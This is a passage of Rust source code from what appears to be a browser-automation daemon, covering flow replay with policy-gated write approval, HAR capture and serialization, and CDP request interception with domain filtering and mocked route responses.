             hint: [a('name'), e.id, a('aria-label'), a('placeholder'), label].filter(Boolean).join(' ') }; })()",
            None,
        )
        .await
        .ok()?;
    (!value.is_null()).then(|| super::flow::FieldTraits::from_value(&value))
}

/// The page's own description of the field a `fill` or `type` writes to.
async fn flow_field_traits(
    action: &str,
    cmd: &Value,
    state: &DaemonState,
) -> Option<super::flow::FieldTraits> {
    let pastes =
        action == "clipboard" && cmd.get("operation").and_then(|v| v.as_str()) == Some("paste");
    let is_text_entry = pastes
        || matches!(action, "inserttext" | "press" | "keydown" | "keyup")
        || (action == "keyboard"
            && matches!(
                cmd.get("subaction").and_then(|v| v.as_str()),
                Some("type" | "insertText")
            ));
    if is_text_entry {
        return flow_active_field_traits(state).await;
    }
    if !matches!(action, "fill" | "type") {
        return None;
    }
    let selector = cmd.get("selector").and_then(|v| v.as_str())?;
    let mgr = state.browser.as_ref()?;
    let session_id = mgr.active_session_id().ok()?.to_string();
    let value = super::element::get_field_traits(
        &mgr.client,
        &session_id,
        &state.ref_map,
        selector,
        &state.iframe_sessions,
    )
    .await
    .ok()?;
    Some(super::flow::FieldTraits::from_value(&value))
}

/// CDP `resourceType` of a flow's direct request: the type Fetch.requestPaused
/// reports for the page tier's `fetch()` (Chrome reports it as XHR).
const FLOW_DIRECT_RESOURCE_TYPE: &str = "XHR";

/// The route that answers a request: the first one, in registration order,
/// whose URL pattern and resource types match and that aborts or has a
/// response. Shared by browser interception and the flow HTTP tier.
fn select_route<'a>(
    routes: &'a [RouteEntry],
    url: &str,
    resource_type: &str,
) -> Option<&'a RouteEntry> {
    routes.iter().find(|route| {
        route_url_matches(&route.url_pattern, url)
            && (route.resource_types.is_empty()
                || route
                    .resource_types
                    .iter()
                    .any(|rt| rt.eq_ignore_ascii_case(resource_type)))
            && (route.abort || route.response.is_some())
    })
}

/// The session route that would answer this request in the page, if any.
async fn flow_routed_response(
    state: &DaemonState,
    url: &str,
) -> Option<super::flow::RoutedResponse> {
    let routes = state.routes.read().await;
    flow_route_answer(&routes, url)
}

fn flow_route_answer(routes: &[RouteEntry], url: &str) -> Option<super::flow::RoutedResponse> {
    let route = select_route(routes, url, FLOW_DIRECT_RESOURCE_TYPE)?;
    if route.abort {
        return Some(super::flow::RoutedResponse {
            abort: true,
            status: 0,
            body: String::new(),
        });
    }
    let resp = route.response.as_ref()?;
    Some(super::flow::RoutedResponse {
        abort: false,
        status: resp.status.unwrap_or(200),
        body: resp.body.clone().unwrap_or_default(),
    })
}

async fn flow_ensure_browser(state: &mut DaemonState) -> Result<(), String> {
    if state.browser.is_none() {
        auto_launch(state, Vec::new()).await?;
        state.webmcp_enabled = state.settings.webmcp();
    }
    Ok(())
}

/// A write only the command replay sends: the policy file can deny it, and
/// it needs `--allow-write` or a confirmation like any other write.
fn replay_write_approved(
    state: &DaemonState,
    allow: &super::flow::AllowWrite,
    write: &super::flow::Write,
) -> Result<(), String> {
    let action = write.action();
    let confirmed = state.confirmed_policy_actions.contains(&action);
    if let Some(policy) = state.policy.as_ref() {
        match policy.check(&action) {
            PolicyResult::Allow => {}
            PolicyResult::Deny(reason) => return Err(format!("denied by policy: {}", reason)),
            PolicyResult::RequiresConfirmation if !confirmed => {
                return Err("the policy requires confirmation".to_string())
            }
            PolicyResult::RequiresConfirmation => {}
        }
    }
    if !confirmed
        && state
            .confirm_actions
            .as_ref()
            .is_some_and(|ca| ca.requires_confirmation(&action))
    {
        return Err("--confirm-actions requires confirmation".to_string());
    }
    if allow.covers(&write.id) || confirmed {
        Ok(())
    } else {
        Err(format!("rerun with --allow-write {} to allow it", write.id))
    }
}

/// The daemon behind the flow ports: the browser session, its cookies and
/// routes, and the commands a replay runs.
struct FlowWiring<'a> {
    state: &'a mut DaemonState,
    allow: &'a super::flow::AllowWrite,
    started_har: bool,
    /// The session's HAR content mode, to put back after a replay that
    /// needed bodies the mode would not keep.
    restore_content: Option<HarContentMode>,
    mark: usize,
}

impl<'a> FlowWiring<'a> {
    fn new(state: &'a mut DaemonState, allow: &'a super::flow::AllowWrite) -> Self {
        FlowWiring {
            state,
            allow,
            started_har: false,
            restore_content: None,
            mark: 0,
        }
    }
}

#[async_trait::async_trait]
impl super::flow::Browser for FlowWiring<'_> {
    async fn cookie_header(&mut self, url: &str) -> Option<String> {
        let mgr = self.state.browser.as_ref()?;
        let sid = mgr.active_session_id().ok()?;
        cookies::get_cookies(&mgr.client, sid, Some(vec![url.to_string()]))
            .await
            .ok()
            .map(|c| super::flow::cookie_header(&c))
    }

    async fn routed_response(&mut self, url: &str) -> Option<super::flow::RoutedResponse> {
        flow_routed_response(self.state, url).await
    }

    async fn tab_url(&mut self) -> Option<String> {
        match self.state.browser.as_ref() {
            Some(mgr) => mgr.get_url().await.ok(),
            None => None,
        }
    }

    async fn eval(&mut self, script: &str) -> Result<Value, String> {
        match self.state.browser.as_ref() {
            Some(mgr) => mgr.evaluate(script, None).await,
            None => Err("Browser not launched".to_string()),
        }
    }

    async fn ensure_browser(&mut self) -> Result<(), String> {
        flow_ensure_browser(self.state).await
    }

    async fn begin_capture(&mut self) -> Result<usize, String> {
        self.started_har = !self.state.har_recording;
        if self.started_har {
            handle_har_start(&json!({}), self.state).await?;
        }
        // Earlier tiers' responses may still be queued; they are not the
        // replay's, and they are drained before the mode changes so they
        // gain no bodies.
        let _ = self.state.drain_cdp_events_background().await;
        if !self.started_har && self.state.har_content_mode == HarContentMode::None {
            // The replay reads its answers from bodies, so it keeps them for
            // its own requests even when the session's HAR does not.
            self.restore_content = Some(HarContentMode::None);
            self.state.har_content_mode = HarContentMode::Text;
        }
        self.mark = self.state.har_entries.len();
        Ok(self.mark)
    }

    async fn run(&mut self, cmd: &Value) -> Value {
        Box::pin(execute_command(cmd, self.state)).await
    }

    async fn captured_since(&mut self, mark: usize) -> Vec<HarEntry> {
        let _ = self.state.drain_cdp_events_background().await;
        self.state.har_entries[mark.min(self.state.har_entries.len())..].to_vec()
    }

    async fn end_capture(&mut self) {
        let _ = self.state.drain_cdp_events_background().await;
        if let Some(mode) = self.restore_content.take() {
            // Entries from before the replay keep the no-body mode they had.
            let keep = self.mark.min(self.state.har_entries.len());
            for e in &mut self.state.har_entries[..keep] {
                let size = e.response_body.take().map_or(0, |b| b.len());
                e.response_body_base64 = false;
                self.state.har_body_total_bytes =
                    self.state.har_body_total_bytes.saturating_sub(size);
            }
            self.state.har_content_mode = mode;
        }
        if self.started_har {
            self.state.har_recording = false;
            self.state.har_entries.clear();
            self.state.har_body_total_bytes = 0;
        } else {
            // The session's own capture keeps only what it held before the run.
            let keep = self.mark.min(self.state.har_entries.len());
            let dropped: usize = self.state.har_entries[keep..]
                .iter()
                .map(|e| e.response_body.as_ref().map_or(0, |b| b.len()))
                .sum();
            self.state.har_entries.truncate(keep);
            self.state.har_body_total_bytes =
                self.state.har_body_total_bytes.saturating_sub(dropped);
        }
    }

    fn write_approved(&self, write: &super::flow::Write) -> Result<(), String> {
        replay_write_approved(self.state, self.allow, write)
    }
}

/// One sender per tier over the same daemon wiring.
struct DaemonSenders<'a> {
    wiring: FlowWiring<'a>,
    client: super::flow::HttpClients,
    flow: &'a super::flow::Flow,
    params: &'a [(String, String)],
    replay_run: Option<super::flow::ReplayRun>,
    /// When the run must be done, so the CLI is still waiting for it.
    run_deadline: std::time::Instant,
}

#[async_trait::async_trait]
impl super::flow::Senders for DaemonSenders<'_> {
    async fn send(
        &mut self,
        tier: super::flow::Tier,
        req: &super::flow::PreparedRequest,
        ctx: &super::flow::SendCtx<'_>,
    ) -> super::flow::TierResult {
        use super::flow::{http, page, replay, Tier};
        match tier {
            Tier::Http => http::send(&self.client, &mut self.wiring, req, self.run_deadline).await,
            Tier::Page => page::send(self.flow, &mut self.wiring, req, self.run_deadline).await,
            Tier::Replay => {
                replay::send(
                    self.flow,
                    self.params,
                    &mut self.wiring,
                    &mut self.replay_run,
                    req,
                    ctx,
                    self.run_deadline,
                )
                .await
            }
        }
    }

    fn replay_ran(&self) -> bool {
        self.replay_run.is_some()
    }
}

fn attach_flow_availability<'a>(
    resp: &'a mut Value,
    action: &'a str,
    state: &'a mut DaemonState,
) -> std::pin::Pin<Box<dyn std::future::Future<Output = ()> + Send + 'a>> {
    Box::pin(add_flow_availability(resp, action, state))
}

async fn add_flow_availability(resp: &mut Value, action: &str, state: &mut DaemonState) {
    if !super::flow::wants_hint(action, resp) {
        return;
    }
    let url = match state.browser.as_ref() {
        Some(mgr) => mgr.get_url().await.ok(),
        None => None,
    };
    super::flow::attach_availability(
        resp,
        url.as_deref(),
        &mut state.flow_hinted,
        state.flow.saved(),
    );
}

fn handle_flow_list(cmd: &Value) -> Result<Value, String> {
    let origin = cmd.get("origin").and_then(|v| v.as_str());
    Ok(json!({ "flows": super::flow::list_flows(origin) }))
}

// ---------------------------------------------------------------------------
// HAR serialization helpers
// ---------------------------------------------------------------------------

/// Convert a `HarEntry` (collected from CDP events) into a HAR 1.2 entry object.
fn har_entry_to_json(e: &HarEntry) -> Value {
    let started_date_time = har_wall_time_to_rfc3339(e.wall_time);

    let request_cookies = e
        .request_headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("cookie"))
        .map(|(_, v)| har_parse_request_cookies(v))
        .unwrap_or_default();

    let query_string = har_parse_query_string(&e.url);

    let req_headers: Vec<Value> = e
        .request_headers
        .iter()
        .map(|(k, v)| json!({ "name": k, "value": v }))
        .collect();

    let resp_cookies: Vec<Value> = e
        .response_headers
        .iter()
        .filter(|(k, _)| k.eq_ignore_ascii_case("set-cookie"))
        .map(|(_, v)| {
            // Split on ';' first to discard attributes (Path, HttpOnly, etc.),
            // then split on '=' once to separate name from value.
            let name_value = v.split(';').next().unwrap_or("");
            let (name, value) = name_value.split_once('=').unwrap_or((name_value, ""));
            json!({ "name": name.trim(), "value": value.trim() })
        })
        .collect();

    let resp_headers: Vec<Value> = e
        .response_headers
        .iter()
        .map(|(k, v)| json!({ "name": k, "value": v }))
        .collect();

    let (timings, total_time) =
        har_compute_timings(e.cdp_timing.as_ref(), e.loading_finished_timestamp);

    let mime_type = if e.mime_type.is_empty() {
        "application/octet-stream"
    } else {
        e.mime_type.as_str()
    };

    let post_content_type = e
        .request_headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("content-type"))
        .map(|(_, v)| v.as_str())
        .unwrap_or("text/plain")
        .to_string();

    let mut request = json!({
        "method": e.method,
        "url": e.url,
        "httpVersion": e.http_version,
        "cookies": request_cookies,
        "headers": req_headers,
        "queryString": query_string,
        "headersSize": -1,
        "bodySize": e.request_body_size,
    });
    if let Some(body) = &e.post_data {
        request["postData"] = json!({ "mimeType": post_content_type, "text": body });
    }

    let mut content = json!({
        "size": e.response_body_size,
        "mimeType": mime_type,
    });
    if let Some(body) = &e.response_body {
        content["text"] = json!(body);
        if e.response_body_base64 {
            content["encoding"] = json!("base64");
        }
    }

    json!({
        "startedDateTime": started_date_time,
        "time": total_time,
        "request": request,
        "response": {
            "status": e.status.unwrap_or(0),
            "statusText": e.status_text,
            "httpVersion": e.http_version,
            "cookies": resp_cookies,
            "headers": resp_headers,
            "content": content,
            "redirectURL": e.redirect_url,
            "headersSize": -1,
            "bodySize": e.response_body_size,
        },
        "cache": {},
        "timings": timings,
        "_resourceType": e.resource_type,
    })
}

/// Convert a CDP headers object (`{ "Name": "value", ... }`) into a flat
/// `Vec<(name, value)>` preserving insertion order.
fn har_extract_headers(headers_val: Option<&Value>) -> Vec<(String, String)> {
    headers_val
        .and_then(|v| v.as_object())
        .map(|obj| {
            obj.iter()
                .map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string()))
                .collect()
        })
        .unwrap_or_default()
}

/// Whether a MIME type is text-like enough to embed as HAR `content.text`
/// under [`HarContentMode::Text`].
fn har_mime_is_text(mime: &str) -> bool {
    let mime = mime
        .split(';')
        .next()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase();
    mime.starts_with("text/")
        || mime.ends_with("+json")
        || mime.ends_with("+xml")
        || matches!(
            mime.as_str(),
            "application/json"
                | "application/xml"
                | "application/javascript"
                | "application/x-javascript"
                | "application/ecmascript"
                | "application/x-www-form-urlencoded"
                | "application/graphql"
        )
}

/// Map a CDP `response.protocol` value to an HTTP-version string as required
/// by the HAR spec (e.g. `"h2"` → `"HTTP/2.0"`).
fn har_cdp_protocol_to_http_version(protocol: &str) -> String {
    match protocol.to_ascii_lowercase().as_str() {
        "h2" => "HTTP/2.0".to_string(),
        "h3" => "HTTP/3.0".to_string(),
        "http/1.0" => "HTTP/1.0".to_string(),
        _ => "HTTP/1.1".to_string(),
    }
}

/// Parse query-string parameters from a URL into a HAR `queryString` array.
fn har_parse_query_string(url_str: &str) -> Vec<Value> {
    url::Url::parse(url_str)
        .map(|u| {
            u.query_pairs()
                .map(|(k, v)| json!({ "name": k.as_ref(), "value": v.as_ref() }))
                .collect()
        })
        .unwrap_or_default()
}

/// Parse a `Cookie: name1=val1; name2=val2` header value into HAR cookie objects.
fn har_parse_request_cookies(cookie_header: &str) -> Vec<Value> {
    cookie_header
        .split(';')
        .filter_map(|pair| {
            let pair = pair.trim();
            if pair.is_empty() {
                return None;
            }
            let (name, value) = pair.split_once('=').unwrap_or((pair, ""));
            Some(json!({ "name": name.trim(), "value": value.trim() }))
        })
        .collect()
}

/// Copies a CDP `Response` (from `responseReceived` or a `redirectResponse`)
/// onto its tracked request.
fn tracked_fill_response(entry: &mut TrackedRequest, response: &Value) {
    entry.status = response.get("status").and_then(|v| v.as_i64());
    entry.mime_type = response
        .get("mimeType")
        .and_then(|v| v.as_str())
        .map(String::from);
    entry.response_headers = response.get("headers").cloned();
}

/// Copies a CDP `Response` (from `responseReceived` or a `redirectResponse`)
/// onto its HAR entry.
fn har_fill_response(entry: &mut HarEntry, response: &Value) {
    entry.status = response.get("status").and_then(|v| v.as_i64());
    entry.status_text = response
        .get("statusText")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    entry.mime_type = response
        .get("mimeType")
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string();
    entry.http_version = response
        .get("protocol")
        .and_then(|v| v.as_str())
        .map(har_cdp_protocol_to_http_version)
        .unwrap_or_else(|| "HTTP/1.1".to_string());
    entry.response_headers = har_extract_headers(response.get("headers"));
    entry.redirect_url = entry
        .response_headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case("location"))
        .map(|(_, v)| v.clone())
        .unwrap_or_default();
    entry.response_body_size = response
        .get("encodedDataLength")
        .and_then(|v| v.as_i64())
        .unwrap_or(-1);
    entry.cdp_timing = response.get("timing").cloned();
    entry.remote_addr = response
        .get("remoteIPAddress")
        .and_then(|v| v.as_str())
        .and_then(|ip| {
            ip.trim_start_matches('[')
                .trim_end_matches(']')
                .parse::<std::net::IpAddr>()
                .ok()
        })
        .zip(
            response
                .get("remotePort")
                .and_then(|v| v.as_u64())
                .and_then(|p| u16::try_from(p).ok()),
        )
        .map(|(ip, port)| std::net::SocketAddr::new(ip, port));
}

/// Compute HAR `timings` and total `time` (ms) from a CDP `ResourceTiming`
/// object and the optional `Network.loadingFinished` monotonic timestamp.
///
/// CDP timing values are milliseconds relative to `requestTime` (seconds since
/// browser start). A value of `-1` means the phase did not occur.
fn har_compute_timings(
    cdp_timing: Option<&Value>,
    loading_finished_ts: Option<f64>,
) -> (Value, f64) {
    let Some(t) = cdp_timing else {
        return (json!({ "send": 0, "wait": 0, "receive": 0 }), 0.0);
    };

    let get = |key: &str| t.get(key).and_then(|v| v.as_f64()).unwrap_or(-1.0);

    let request_time = get("requestTime");
    let dns_start = get("dnsStart");
    let dns_end = get("dnsEnd");
    let connect_start = get("connectStart");
    let connect_end = get("connectEnd");
    let ssl_start = get("sslStart");
    let ssl_end = get("sslEnd");
    let send_start = get("sendStart");
    let send_end = get("sendEnd");
    let recv_headers_start = get("receiveHeadersStart");
    let recv_headers_end = get("receiveHeadersEnd");

    let dns = if dns_start >= 0.0 && dns_end >= 0.0 {
        dns_end - dns_start
    } else {
        -1.0
    };
    let connect = if connect_start >= 0.0 && connect_end >= 0.0 {
        connect_end - connect_start
    } else {
        -1.0
    };
    let ssl = if ssl_start >= 0.0 && ssl_end >= 0.0 {
        ssl_end - ssl_start
    } else {
        -1.0
    };
    let send = (send_end - send_start).max(0.0);

    // wait: end of sending → first byte of response headers.
    let wait_end = if recv_headers_start >= 0.0 {
        recv_headers_start
    } else {
        recv_headers_end
    };
    let wait = if send_end >= 0.0 && wait_end >= send_end {
        wait_end - send_end
    } else {
        0.0
    };

    // receive: first response byte → loading complete.
    // requestTime (seconds) + recv_headers_end (ms) / 1000 = absolute headers-end timestamp.
    let receive = loading_finished_ts
        .filter(|_| request_time >= 0.0 && recv_headers_end >= 0.0)
        .map(|lf_ts| {
            let recv_start_abs = request_time + recv_headers_end / 1000.0;
            ((lf_ts - recv_start_abs) * 1000.0).max(0.0)
        })
        .unwrap_or(0.0);

    let blocked = if dns_start > 0.0 {
        dns_start
    } else if connect_start > 0.0 {
        connect_start
    } else if send_start > 0.0 {
        send_start
    } else {
        -1.0
    };

    let total: f64 = [
        if blocked > 0.0 { blocked } else { 0.0 },
        if dns >= 0.0 { dns } else { 0.0 },
        if connect >= 0.0 { connect } else { 0.0 },
        send,
        wait,
        receive,
    ]
    .iter()
    .sum();

    let mut timings = json!({ "send": send, "wait": wait, "receive": receive });
    if blocked > 0.0 {
        timings["blocked"] = json!(blocked);
    }
    if dns >= 0.0 {
        timings["dns"] = json!(dns);
    }
    if connect >= 0.0 {
        timings["connect"] = json!(connect);
    }
    if ssl >= 0.0 {
        timings["ssl"] = json!(ssl);
    }

    (timings, total)
}

/// Format a Unix epoch timestamp (seconds, fractional) as RFC 3339 using the
/// `time` crate, e.g. `"2024-03-17T10:30:00.456Z"`.
fn har_wall_time_to_rfc3339(wall_time: f64) -> String {
    if wall_time > 0.0 {
        let nanos = (wall_time * 1_000_000_000.0).round() as i128;
        if let Ok(dt) = OffsetDateTime::from_unix_timestamp_nanos(nanos) {
            if let Ok(s) = dt.format(&Rfc3339) {
                return s;
            }
        }
    }
    OffsetDateTime::now_utc()
        .format(&Rfc3339)
        .unwrap_or_else(|_| "1970-01-01T00:00:00Z".to_string())
}

fn har_output_path(explicit_path: Option<&str>) -> String {
    match explicit_path {
        Some(path) => path.to_string(),
        None => {
            let dir = get_har_dir();
            let _ = std::fs::create_dir_all(&dir);
            dir.join(format!("har-{}.har", unix_timestamp_millis()))
                .to_string_lossy()
                .to_string()
        }
    }
}

fn get_har_dir() -> PathBuf {
    if let Some(home) = std::env::home_dir() {
        home.join(".agent-browser").join("tmp").join("har")
    } else {
        std::env::temp_dir().join("agent-browser").join("har")
    }
}

fn unix_timestamp_millis() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis()
}

async fn har_browser_metadata(state: &DaemonState) -> Option<Value> {
    let mgr = state.browser.as_ref()?;
    if !mgr.is_connection_alive().await {
        return None;
    }

    let version = mgr
        .client
        .send_command_no_params("Browser.getVersion", None)
        .await
        .ok()?;
    browser_metadata_from_version(&version)
}

fn browser_metadata_from_version(version: &Value) -> Option<Value> {
    let product = version.get("product").and_then(|v| v.as_str())?;
    let (name, browser_version) = product.split_once('/').unwrap_or((product, ""));
    Some(json!({
        "name": name,
        "version": browser_version,
    }))
}

// ---------------------------------------------------------------------------
// Fetch interception resolver (domain filter + routes + origin headers)
// ---------------------------------------------------------------------------

fn collapse_wildcards(pattern: &str) -> String {
    let mut out = String::with_capacity(pattern.len());
    let mut last_was_star = false;
    for ch in pattern.chars() {
        if ch == '*' {
            if !last_was_star {
                out.push(ch);
            }
            last_was_star = true;
        } else {
            out.push(ch);
            last_was_star = false;
        }
    }
    out
}

/// Status, headers and base64 body for a mocked route response. A mock gets
/// CORS headers only for the origin the route allows (`--allow-origin`), so a
/// page from any other origin cannot read it.
fn mocked_response(
    resp: &RouteResponse,
    request_headers: Option<&serde_json::Map<String, Value>>,
) -> (u16, Vec<Value>, String) {
    let status = resp.status.unwrap_or(200);
    let body_str = resp.body.as_deref().unwrap_or("");
    let encoded = base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD,
        body_str.as_bytes(),
    );
    let mut headers = vec![];
    let route_sets = |name: &str| {
        resp.headers
            .as_ref()
            .is_some_and(|h| h.keys().any(|k| k.eq_ignore_ascii_case(name)))
    };
    // A JSON body with no content type is labeled as JSON, so the
    // page and HAR capture read it as JSON.
    let content_type = resp.content_type.clone().or_else(|| {
        if route_sets("content-type") {
            return None;
        }
        serde_json::from_str::<Value>(body_str)
            .is_ok()
            .then(|| "application/json".to_string())
    });
    if let Some(ct) = &content_type {
        headers.push(json!({ "name": "Content-Type", "value": ct }));
    }
    if let Some(h) = &resp.headers {
        for (k, v) in h {
            headers.push(json!({ "name": k, "value": v }));
        }
    }
    let header = |name: &str| {
        request_headers.and_then(|h| {
            h.iter()
                .find(|(k, _)| k.eq_ignore_ascii_case(name))
                .and_then(|(_, v)| v.as_str())
                .map(String::from)
        })
    };
    let has_acao = route_sets("access-control-allow-origin");
    let origin = header("origin")
        .or_else(|| {
            header("referer")
                .and_then(|r| url::Url::parse(&r).ok())
                .map(|u| u.origin().ascii_serialization())
        })
        .filter(|o| {
            resp.allow_origin
                .as_deref()
                .is_some_and(|allowed| allowed.trim_end_matches('/') == o)
        });
    let preflight = header("access-control-request-method");
    if let (false, Some(origin)) = (has_acao, &origin) {
        let mut add = |name: &str, value: &str| {
            if !route_sets(name) {
                headers.push(json!({ "name": name, "value": value }));
            }
        };
        add("Access-Control-Allow-Origin", origin);
        add("Access-Control-Allow-Credentials", "true");
        if let Some(method) = &preflight {
            add("Access-Control-Allow-Methods", method);
            if let Some(h) = header("access-control-request-headers") {
                add("Access-Control-Allow-Headers", &h);
            }
        }
    }
    let (status, encoded) = if preflight.is_some() && !has_acao && origin.is_some() {
        (204, String::new())
    } else {
        (status, encoded)
    };
    (status, headers, encoded)
}

fn route_url_matches(pattern: &str, url: &str) -> bool {
    if pattern == "*" {
        return true;
    }
    if !pattern.contains('*') {
        return url.contains(pattern);
    }

    let pattern = collapse_wildcards(pattern);
    let parts: Vec<&str> = pattern.split('*').filter(|p| !p.is_empty()).collect();
    if parts.is_empty() {
        return true;
    }

    let anchored_start = !pattern.starts_with('*');
    let anchored_end = !pattern.ends_with('*');
    let mut pos = 0usize;
    let mut idx = 0usize;

    if anchored_start {
        let first = parts[0];
        if !url.starts_with(first) {
            return false;
        }
        pos = first.len();
        idx = 1;
    }

    while idx < parts.len() {
        let part = parts[idx];
        let Some(found) = url[pos..].find(part) else {
            return false;
        };
        pos += found + part.len();
        idx += 1;
    }

    if anchored_end {
        if let Some(last) = parts.last() {
            return url.ends_with(last);
        }
    }

    true
}

async fn resolve_fetch_paused(
    client: &CdpClient,
    domain_filter: Option<&DomainFilter>,
    routes: &[RouteEntry],
    origin_headers: &HashMap<String, HashMap<String, String>>,
    blocked_documents: &std::sync::Mutex<HashMap<String, String>>,
    paused: &FetchPausedRequest,
) {
    let session_id = &paused.session_id;

    // Domain filter check (takes priority over routes and origin headers)
    if let Some(filter) = domain_filter {
        if let Ok(parsed) = url::Url::parse(&paused.url) {
            let scheme = parsed.scheme();
            let enforce_host = matches!(scheme, "http" | "https" | "ws" | "wss");
            if !enforce_host {
                if paused.resource_type.eq_ignore_ascii_case("document") {
                    let _ = client
                        .send_command(
                            "Fetch.failRequest",
                            Some(json!({
                                "requestId": paused.request_id,
                                "errorReason": "BlockedByClient"
                            })),
                            Some(session_id),
                        )
                        .await;
                } else {
                    let _ = client
                        .send_command(
                            "Fetch.continueRequest",
                            Some(json!({ "requestId": paused.request_id })),
                            Some(session_id),
                        )
                        .await;
                }
                return;
            }

            if let Some(hostname) = parsed.host_str() {
                if !filter.is_allowed(hostname) {
                    if paused.resource_type.eq_ignore_ascii_case("document") {
                        blocked_documents
                            .lock()
                            .unwrap_or_else(|e| e.into_inner())
                            .insert(paused.frame_id.clone(), paused.url.clone());
                        let error_body = format!(
                            "<html><body><h1>Blocked</h1><p>Navigation to {} is not allowed by domain filter.</p></body></html>",
                            hostname
                        );
                        let encoded = base64::Engine::encode(
                            &base64::engine::general_purpose::STANDARD,
                            error_body.as_bytes(),
                        );
                        let _ = client
                            .send_command(
                                "Fetch.fulfillRequest",
                                Some(json!({
                                    "requestId": paused.request_id,
                                    "responseCode": 403,
                                    "responseHeaders": [
                                        { "name": "Content-Type", "value": "text/html" },
                                    ],
                                    "body": encoded,
                                })),
                                Some(session_id),
                            )
                            .await;
                    } else {
                        let _ = client
                            .send_command(
                                "Fetch.failRequest",
                                Some(json!({
                                    "requestId": paused.request_id,
                                    "errorReason": "BlockedByClient"
                                })),
                                Some(session_id),
                            )
                            .await;
                    }
                    return;
                }
            }
        }
    }

    // Route matching
    if let Some(route) = select_route(routes, &paused.url, &paused.resource_type) {
        if route.abort {
            let _ = client
                .send_command(
                    "Fetch.failRequest",
                    Some(json!({
                        "requestId": paused.request_id,
                        "errorReason": "Failed"
                    })),
                    Some(session_id),
                )
                .await;
            return;
        }

        if let Some(ref resp) = route.response {
            let (status, headers, encoded) = mocked_response(resp, paused.request_headers.as_ref());
            let _ = client
                .send_command(
                    "Fetch.fulfillRequest",
                    Some(json!({
                        "requestId": paused.request_id,
                        "responseCode": status,
                        "responseHeaders": headers,
                        "body": encoded,
                    })),
                    Some(session_id),
                )
                .await;
            return;
        }
    }

    // No matching route — continue, injecting origin-scoped headers if applicable.
    let extra = url::Url::parse(&paused.url)
        .ok()
        .map(|u| u.origin().ascii_serialization())
        .and_then(|o| origin_headers.get(&o));

    if let Some(extra_headers) = extra {
        // Merge original request headers with extra headers.
        // Fetch.continueRequest replaces (not merges), so include originals.
        let mut combined: Vec<Value> = Vec::new();
        if let Some(ref orig) = paused.request_headers {
            for (k, v) in orig {
                if !extra_headers.keys().any(|ek| ek.eq_ignore_ascii_case(k)) {
                    if let Some(s) = v.as_str() {
                        combined.push(json!({ "name": k, "value": s }));
                    }
                }
            }
        }
        for (k, v) in extra_headers {
            combined.push(json!({ "name": k, "value": v }));
        }
        let _ = client
            .send_command(
                "Fetch.continueRequest",
                Some(json!({ "requestId": paused.request_id, "headers": combined })),
                Some(session_id),
            )
            .await;
    } else {
        let _ = client
            .send_command(
                "Fetch.continueRequest",
                Some(json!({ "requestId": paused.request_id })),
                Some(session_id),
            )
            .await;
    }
}

// ---------------------------------------------------------------------------
// Route handlers
// ---------------------------------------------------------------------------

/// Build the Fetch.enable patterns list from current routes, domain filter,
/// and origin headers state.  When domain filtering or origin-scoped headers
/// are active a wildcard pattern is included so all requests are intercepted.
async fn build_fetch_patterns(state: &DaemonState) -> Vec<Value> {
    let routes = state.routes.read().await;
    let mut patterns: Vec<Value> = routes
        .iter()
        .map(|r| json!({ "urlPattern": collapse_wildcards(&r.url_pattern) }))
        .collect();
    let has_domain_filter = state.domain_filter.read().await.is_some();
    let has_origin_headers = !state.origin_headers.read().await.is_empty();
    let has_proxy_creds = state.proxy_credentials.read().await.is_some();
    if (has_domain_filter || has_origin_headers || has_proxy_creds)
        && !patterns.iter().any(|p| p["urlPattern"] == "*")
    {
        patterns.push(json!({ "urlPattern": "*" }));
    }
    patterns
}

/// Build the full Fetch.enable params object, including `handleAuthRequests`
/// when proxy credentials are configured.
async fn build_fetch_enable_params(state: &DaemonState, patterns: Vec<Value>) -> Value {
    let has_proxy_creds = state.proxy_credentials.read().await.is_some();
    if has_proxy_creds {
        json!({ "patterns": patterns, "handleAuthRequests": true })
    } else {
        json!({ "patterns": patterns })
    }
}

fn parse_route_response(cmd: &Value) -> Option<RouteResponse> {
    cmd.get("response")
        .and_then(|v| {
            if v.is_null() {
                return None;
            }
            Some(RouteResponse {
                status: v.get("status").and_then(|s| s.as_u64()).map(|s| s as u16),
                body: v.get("body").and_then(|s| s.as_str()).map(String::from),
                content_type: v
                    .get("contentType")
                    .and_then(|s| s.as_str())
                    .map(String::from),
                allow_origin: v
                    .get("allowOrigin")
                    .and_then(|s| s.as_str())
                    .map(String::from),
                headers: v.get("headers").and_then(|h| {
                    h.as_object().map(|m| {
                        m.iter()
                            .filter_map(|(k, v)| v.as_str().map(|s| (k.clone(), s.to_string())))
                            .collect()
                    })
                }),
            })
        })
        .or_else(|| {
            cmd.get("body")
                .and_then(|v| v.as_str())
                .map(|body| RouteResponse {
                    status: None,
                    body: Some(body.to_string()),
                    content_type: None,
                    headers: None,
                    allow_origin: cmd
                        .get("allowOrigin")
                        .and_then(|s| s.as_str())
                        .map(String::from),
                })
        })
}

async fn handle_route(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let url_pattern = cmd
        .get("url")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'url' parameter")?
        .to_string();
    let abort = cmd.get("abort").and_then(|v| v.as_bool()).unwrap_or(false);

    let resource_types: Vec<String> = cmd
        .get("resourceType")
        .or_else(|| cmd.get("resourceTypes"))
        .and_then(|v| {
            if let Some(s) = v.as_str() {
                Some(
                    s.split(',')
                        .map(|p| p.trim().to_string())
                        .filter(|p| !p.is_empty())
                        .collect(),
                )
            } else {
                v.as_array().map(|arr| {
                    arr.iter()
                        .filter_map(|x| x.as_str().map(String::from))
                        .filter(|s| !s.is_empty())
                        .collect()
                })
            }
        })
        .unwrap_or_default();

    let response = parse_route_response(cmd);

    {
        let mut routes = state.routes.write().await;
        routes.push(RouteEntry {
            url_pattern: url_pattern.clone(),
            response,
            abort,
            resource_types,
        });
    }

    let patterns = build_fetch_patterns(state).await;
